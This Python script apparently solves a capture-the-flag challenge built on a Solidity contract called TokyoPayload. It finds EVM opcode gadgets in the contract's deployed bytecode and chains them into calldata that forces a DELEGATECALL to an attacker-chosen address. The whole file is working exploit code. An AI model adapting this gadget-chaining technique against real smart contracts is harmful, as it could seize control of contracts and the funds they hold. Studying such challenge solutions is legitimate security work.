import json
import sys

argc = len(sys.argv)

if argc >= 2:
    addr = int(sys.argv[1], 16)
else:
    addr = 0x0011223344556677889900112233445566778899

if argc == 3:
    bytecode = bytes.fromhex(sys.argv[2][2:])
else:
    with open("out/TokyoPayload.sol/TokyoPayload.json") as f:
        contract_json = json.load(f)
        bytecode = bytes.fromhex(contract_json["deployedBytecode"]["object"][2:])


def uint256str(x):
    return hex(x)[2:].zfill(64)


def find_gadget(needle_hex: str, n=1, gadget_idx=0):
    global bytecode
    needle = bytes.fromhex(needle_hex)
    assert needle in bytecode
    count = bytecode.count(needle)
    assert count == n, f"count: {count}"
    idx = -1
    for _ in range(gadget_idx + 1):
        idx = bytecode.index(needle, idx + 1)
    while True:
        if bytecode[idx] == 0x5B:
            return idx
        idx -= 1


CALLDATALOAD_GADGET_ADDR = find_gadget("5b8035916020")
DELEGATECALL_GADGET_ADDR = find_gadget("f4")
STOP_GADGET_ADDR = find_gadget("5b00")
FREE_MEMORY_POINTER_OVERWRITE_GADGET_ADDR = find_gadget("5b60405190808252")
GASLIMIT_OVERWRITE_GADGET_ADDR = find_gadget("60015556", 2, 1)
POP4_GADGET_ADDR = find_gadget("5b50505050")

CALLDATALOAD_GADGET = uint256str(CALLDATALOAD_GADGET_ADDR)
DELEGATECALL_GADGET = uint256str(DELEGATECALL_GADGET_ADDR)
STOP_GADGET = uint256str(STOP_GADGET_ADDR)
FREE_MEMORY_POINTER_OVERWRITE_GADGET = uint256str(FREE_MEMORY_POINTER_OVERWRITE_GADGET_ADDR)
GASLIMIT_OVERWRITE_GADGET = uint256str(GASLIMIT_OVERWRITE_GADGET_ADDR)
POP4_GADGET = uint256str(POP4_GADGET_ADDR)

DUMMY_ADDRESS = uint256str(addr)
INITIAL_OFFSET = POP4_GADGET_ADDR

payload = ""

memory_offset = 0x5D
payload += "000040c3"  # tokyoPayload(uint256,uint256)
payload += uint256str(memory_offset)
payload += CALLDATALOAD_GADGET
third_arg_offset = DELEGATECALL_GADGET_ADDR + 0x04 + 0x20 * 2
pop4_gadget_insert_offset = third_arg_offset // 0x20 * 0x20
if third_arg_offset % 0x20 != 0:
    pop4_gadget_insert_offset += 0x20
d = pop4_gadget_insert_offset - third_arg_offset
payload += "00" * d
payload += POP4_GADGET 
payload += "00" * (0x20 - d)
payload += "00" * (0x20 * CALLDATALOAD_GADGET_ADDR - 4 - memory_offset)
payload += CALLDATALOAD_GADGET

gadgets = []


def push_stack(item):
    global gadgets
    gadgets.append(item)
    gadgets.append(CALLDATALOAD_GADGET)
    gadgets.append(uint256str(INITIAL_OFFSET + 0x20 * (len(gadgets) + 1)))


push_stack(STOP_GADGET)
push_stack(DUMMY_ADDRESS)
push_stack(DELEGATECALL_GADGET)
push_stack(uint256str(pop4_gadget_insert_offset // 0x20 - 4))
push_stack(GASLIMIT_OVERWRITE_GADGET) 
push_stack(uint256str(0xFF))
push_stack(uint256str(0xFF))
push_stack(uint256str(0xFF))
push_stack(POP4_GADGET)
push_stack(uint256str(0xFE02EF))
push_stack(uint256str(0xFE01EF))
push_stack(uint256str(0xFFFF))
push_stack(FREE_MEMORY_POINTER_OVERWRITE_GADGET)
push_stack(uint256str(0xFF))
push_stack(uint256str(0xFF))
push_stack(uint256str(0xFF))

gadgets.extend(
    [
        POP4_GADGET,
        FREE_MEMORY_POINTER_OVERWRITE_GADGET,
        uint256str(INITIAL_OFFSET + 0x20 * (len(gadgets) + 3)),
        uint256str(0xFD02DF),
        uint256str(0xFD01DF),
        uint256str(0x00),
    ]
)

payload = payload[: 2 * INITIAL_OFFSET] + "".join(gadgets) + payload[2 * (INITIAL_OFFSET + 0x20 * len(gadgets)) :]

print(payload, end="")
